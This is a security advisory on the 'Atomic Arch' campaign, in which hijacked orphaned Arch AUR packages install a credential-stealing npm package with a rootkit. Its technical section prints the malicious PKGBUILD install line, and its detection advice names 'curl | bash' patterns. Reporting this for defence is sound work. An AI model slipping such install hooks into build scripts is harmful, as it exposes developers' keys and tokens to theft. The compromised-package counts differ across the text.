# 'Atomic Arch' Supply Chain Attack Hijacks Orphaned Linux Packages to Target Developers

**Severity:** high | **Category:** Supply Chain Attack,Malware,Threat Actor | **Updated:** 2026-06-27

A sophisticated supply chain attack dubbed 'Atomic Arch' is targeting Linux developers by hijacking trusted but orphaned packages in the Arch User Repository (AUR). Attackers claim ownership of these abandoned packages and modify their build scripts (PKGBUILD) to fetch and install a malicious npm package. This secondary payload, 'atomic-lockfile', deploys a Rust-based infostealer and an eBPF rootkit designed to harvest developer credentials, tokens, and SSH keys. The campaign subverts the AUR's trust model and has compromised over 20 packages in multiple waves.

## Executive Summary
A new and insidious supply chain attack, named 'Atomic Arch,' has been identified targeting developers using the Arch Linux ecosystem. First reported around June 11, 2026, the campaign involves threat actors taking control of legitimate, trusted software packages in the Arch User Repository (AUR) that have been abandoned by their original maintainers. The attackers then modify the package's build instructions (`PKGBUILD` file) to add a malicious post-install script. This script covertly downloads and executes a malicious package from the public **[npm](https://www.npmjs.com/)** registry, which in turn deploys credential-stealing malware. The attack is dangerous because it abuses the inherent trust users have in established AUR packages. Security firm **[Sonatype](https://www.sonatype.com)** has been tracking the campaign, which has already compromised dozens of packages and appears to be ongoing.

## Threat Overview
- **Campaign Name:** Atomic Arch
- **Target:** Developers using Arch Linux and the Arch User Repository (AUR).
- **Attack Vector:** Supply chain attack via hijacking of orphaned AUR packages.
- **Methodology:**
  1. Attacker identifies a trusted but orphaned AUR package.
  2. Attacker requests and is granted ownership of the package.
  3. Attacker modifies the `PKGBUILD` file, adding a malicious post-install command.
  4. A user installs or updates the trusted package, unknowingly executing the malicious command.
  5. The command fetches and installs a malicious npm package (e.g., `atomic-lockfile`).
  6. The npm package deploys the final payload: an infostealer and a rootkit.
- **Payload:** A Rust-based infostealer and an eBPF rootkit designed to harvest developer credentials (SSH keys, API tokens, etc.).

## Technical Analysis
This attack cleverly subverts the community-driven trust model of the AUR. Unlike typosquatting, where an attacker creates a new, similarly named package, this method inherits the reputation and userbase of a previously legitimate project.

The core of the attack lies in modifying the `PKGBUILD` file. A typical malicious addition might look like this in the `post_install()` function:

```bash
# Malicious command added by attacker
/usr/bin/npm install -g atomic-lockfile
```

When an unsuspecting user runs `makepkg -si` or uses an AUR helper to install/update the compromised package, this command is executed with their user privileges. The `atomic-lockfile` npm package, tracked by Sonatype as `Sonatype-2026-003775`, contains the final payload. Analysis shows it includes:
- **A Rust-based Infostealer:** This component is designed to search for and exfiltrate sensitive developer-related information, such as `.ssh` keys, `.aws` credentials, `.kube` configs, and browser data.
- **An eBPF Rootkit:** This provides stealth and persistence capabilities, allowing the malware to hide its processes and network connections from the system administrator.

The campaign has evolved, with a second wave on June 12 using the `Bun` runtime as an alternative to `npm` for installation, demonstrating the attacker's adaptability.

### MITRE ATT&CK TTPs
- **[`T1195.001 - Compromise Software Dependencies and Development Tools`](https://attack.mitre.org/techniques/T1195/001/):** This is the core technique, compromising a trusted software repository.
- **[`T1059.004 - Unix Shell`](https://attack.mitre.org/techniques/T1059/004/):** The `PKGBUILD` file uses shell commands to execute the malicious installation.
- **[`T1105 - Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/):** The `npm install` command transfers the malicious payload from the npm registry to the victim's machine.
- **[`T1552.004 - Private Keys`](https://attack.mitre.org/techniques/T1552/004/):** The infostealer payload is specifically designed to steal SSH and other private keys.
- **[`T1014 - Rootkit`](https://attack.mitre.org/techniques/T1014/):** The use of an eBPF rootkit for stealth and persistence.

## Impact Assessment
The impact on developers is potentially devastating. The theft of SSH keys, API tokens, and other credentials can lead to:
- **Compromise of Corporate Networks:** A developer's stolen SSH key could grant an attacker direct access to production servers or code repositories.
- **Further Supply Chain Attacks:** Stolen credentials for package registries (like npm or PyPI) could allow the attacker to inject malware into even more widely used software.
- **Financial Theft:** Stolen cryptocurrency wallet keys or credentials for cloud providers (like AWS) can lead to direct financial loss.
- **Loss of Intellectual Property:** Attackers could gain access to and steal proprietary source code.

## Detection & Response
1.  **Audit AUR Packages:** Developers using AUR should be extremely cautious. Before installing or updating any package, especially one that was recently orphaned and adopted, carefully inspect the `PKGBUILD` file for any suspicious commands. Look for unexpected network calls, `curl | bash` patterns, or installation of packages from other ecosystems like npm or pip. ([D3-DA: Dynamic Analysis](https://d3fend.mitre.org/technique/d3f:DynamicAnalysis))
2.  **Network Monitoring:** Monitor for unexpected outbound network connections from build processes or package installation scripts. An `install` script should generally not be making arbitrary network connections.
3.  **Check for Malicious Packages:** Search your system for the presence of known malicious npm packages like `atomic-lockfile`.
    ```bash
    npm list -g | grep atomic-lockfile
    ```

## Mitigation
1.  **Scrutinize Build Scripts:** **Never** blindly trust build scripts, even from a known package. Always review the `PKGBUILD` (or `Makefile`, `setup.py`, etc.) before building and installing software from community sources. Treat AUR helpers with caution, as they can automate away this crucial review step.
2.  **Build in Isolated Environments:** Consider building and packaging software in ephemeral, isolated environments like containers or VMs. This can limit the malware's ability to access sensitive files on your host machine. ([D3-DE: Decoy Environment](https://d3fend.mitre.org/technique/d3f:DecoyEnvironment))
3.  **Principle of Least Privilege:** Do not run build or install commands as root unless absolutely necessary. Run `makepkg` as a regular user.
4.  **Use Hardware Tokens:** Store high-value SSH and GPG keys on a hardware token (like a YubiKey). This makes it impossible for malware to simply copy and exfiltrate the key file.

**Tags:** AUR, Arch Linux, Atomic Arch, Developer Security, Infostealer, Malware, Rootkit, Supply Chain Attack, npm

## Sources
- [Atomic Arch npm Campaign Adds Malicious Dependency](https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency)
- [Atomic Arch Campaign Hijacks 20+ Linux AUR Packages to Deliver Malware](https://hackread.com/atomic-arch-hijacks-linux-aur-packages-malware/)
- [Over 400 Arch Linux AUR Packages Hijacked in 'Atomic Arch' Supply Chain Attack](https://thehackernews.com/2026/06/over-400-arch-linux-aur-packages.html)
- [Atomic Arch npm Campaign Adds Malicious Dependency](https://securityboulevard.com/2026/06/atomic-arch-npm-campaign-adds-malicious-dependency/)

---
Source: https://cyber.netsecops.io/articles/atomic-arch-supply-chain-attack-hijacks-orphaned-linux-packages/
